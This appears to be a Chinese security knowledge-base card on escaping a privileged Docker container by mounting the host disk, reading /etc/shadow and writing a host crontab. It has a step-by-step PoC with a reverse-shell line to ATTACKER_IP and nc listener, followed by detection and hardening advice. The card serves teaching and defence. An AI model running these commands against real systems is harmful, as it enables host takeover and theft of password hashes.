---
id: cloud-container-docker-privileged-host-disk-escape
title: Docker 特权容器逃逸：挂载宿主机磁盘并写入 crontab
type: scenario
domain: cloud
path: cloud/container
technique: docker-privileged-host-disk-escape
aliases:
- Docker 特权容器逃逸
- --privileged 逃逸
- 挂载宿主机磁盘
- CapEff 000001ffffffffff
- Docker crontab 逃逸
tags:
- docker
- container
- escape
- privileged
- cap_sys_admin
- mount
- crontab
- linux
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V16
  verified_at: '2026-11-05T02:10:29+08:00'
  notes: 已对照原文与图片30/31/32核对：特权容器 CapEff=000001ffffffffff，fdisk -l 找到 /dev/vda3，mount 后读取 /test/etc/shadow 成功，可写宿主机 crontab 反弹。卡内PoC/路径/Ubuntu/CentOS差异与原文一致。原文未给受影响版本；PoC未本机执行；frontmatter无sources/source_url。
---

## 一句话结论

以 `--privileged=true` 运行的容器拥有宿主机的全部 Linux capabilities（含 `CAP_SYS_ADMIN`），攻击者可在容器内识别宿主机磁盘分区、`mount` 到容器目录，读写宿主机 `/etc/shadow`、写入宿主机 crontab，从而获得宿主机 root 权限。

## 原理

- Docker 默认通过 namespace/cgroups/capabilities 做隔离；`--privileged` 会授予容器几乎所有 capabilities，并放宽设备访问，容器内 root 与宿主机 root 的能力边界基本消失。
- 特权容器可以执行 `mount`。`fdisk -l` 能看到宿主机块设备（如 `/dev/vda`、`/dev/sda`），把宿主机根分区挂载到容器内（如 `/test`）后，即可直接读写宿主机文件系统。
- 通过挂载点读取 `/test/etc/shadow` 可确认宿主机用户哈希；写入 `/test/var/spool/cron/crontabs/root`（Ubuntu）或 `/test/var/spool/cron/root`（CentOS）可让宿主机 cron 执行反弹 shell，获得宿主机 root。
- 判定：`cat /proc/self/status | grep CapEff`，特权容器常见 `000001ffffffffff` 或 `0000003fffffffff`；非特权容器通常为受限值（如 `00000000a80425fb`）。
- 该逃逸不依赖 Docker 漏洞，纯配置错误；需要容器内已有命令执行权限。

## 触发条件

- 容器以 `--privileged` 运行，或等价地授予 `CAP_SYS_ADMIN` 且允许 `mount`。
- 容器内可访问宿主机块设备（未做 device cgroup 限制）。
- 攻击者已获得容器内 shell/命令执行。
- 宿主机 cron 服务运行，且攻击者可写对应 crontab 路径。

## 利用步骤

1. 确认特权：`cat /proc/self/status | grep -i capeff`，看到全量 caps。
2. 查看磁盘：`fdisk -l`，找到宿主机根分区（如 `/dev/vda3`）。
3. 挂载：`mkdir /test && mount /dev/vda3 /test`。
4. 验证：`cat /test/etc/shadow` 能读到宿主机用户哈希。
5. 写入 crontab 反弹 shell（按发行版路径）；等待 cron 触发，攻击者监听端口。
6. 或直接 `chroot /test /bin/bash` 获取宿主机 root shell（视环境）。
7. 清理挂载与定时任务（授权测试后）。

## PoC

```bash
# 1) 确认特权
cat /proc/self/status | grep -i capeff
# CapEff: 000001ffffffffff

# 2) 查看宿主机磁盘
fdisk -l
# Disk /dev/vda ...
# /dev/vda3  413696  83886046  39.8G

# 3) 挂载宿主机根分区
mkdir /test
mount /dev/vda3 /test
cat /test/etc/shadow | head

# 4) 写宿主机 crontab（Ubuntu 路径）
echo '* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/6666 0>&1' >> /test/var/spool/cron/crontabs/root

# 5) 攻击者监听
nc -lvvp 6666
```

CentOS 路径为 `/test/var/spool/cron/root`；部分系统需重启 crond。

## 变体与关联

- 变体：容器有 `CAP_SYS_ADMIN` 但非 `--privileged` 时，仍可能 `mount` 宿主机设备；先测 cap。
- 变体：挂载宿主机 `/` 到容器（`-v /:/host`）时，直接写 `/host/etc/crontab` 或 `chroot /host`。
- 变体：`--pid=host` + `nsenter -t 1 -m -u -i -n -p -- /bin/bash` 进入宿主机命名空间。
- 变体：cgroup `release_agent` 逃逸（需 cgroup v1 与 CAP_SYS_ADMIN），可作为无块设备时的替代。
- 关联：[[cloud-container-docker-socket-tcp-escape]]（Docker Socket/TCP 暴露逃逸）。
- 关联：[[cloud-container-docker-procfs-core-pattern-escape]]（procfs core_pattern 逃逸）。
- 关联：[[cloud-container-k8s-workload-config-escape]]（K8s privileged/hostPath 配置逃逸）。
- 注意：不同发行版磁盘命名、crontab 路径、cron 服务名不同；挂载前确认分区，避免挂错。

## 检测与防御

- 防御：禁止 `--privileged`；按需 drop capabilities，至少移除 `CAP_SYS_ADMIN`；使用 seccomp/AppArmor/SELinux；限制 device cgroup。
- 防御：不要把宿主机块设备、`/`、`/proc`、`/var/run/docker.sock` 挂载进容器；使用只读根文件系统与最小镜像。
- 检测：容器启动参数含 `--privileged`/`CAP_SYS_ADMIN`；容器内出现 `mount`、`fdisk`、对 `/dev/vd*`/`/dev/sd*` 的访问；宿主机 crontab 被异常修改；容器内读取 `/etc/shadow`；异常反弹 shell。
- 响应：隔离容器、检查宿主机 crontab/SSH/账号、轮换凭据、审计宿主机文件完整性。
